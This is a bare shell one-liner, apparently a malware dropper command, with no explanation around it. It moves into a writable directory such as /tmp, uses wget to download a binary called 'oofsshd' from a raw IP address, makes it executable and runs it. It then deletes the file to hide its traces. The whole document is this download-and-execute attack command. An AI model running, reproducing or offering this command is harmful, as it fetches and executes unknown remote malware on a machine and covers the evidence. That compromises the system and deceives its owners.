cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://137.74.148.236/oofsshd; chmod +x oofsshd; ./oofsshd; rm -rf oofsshd
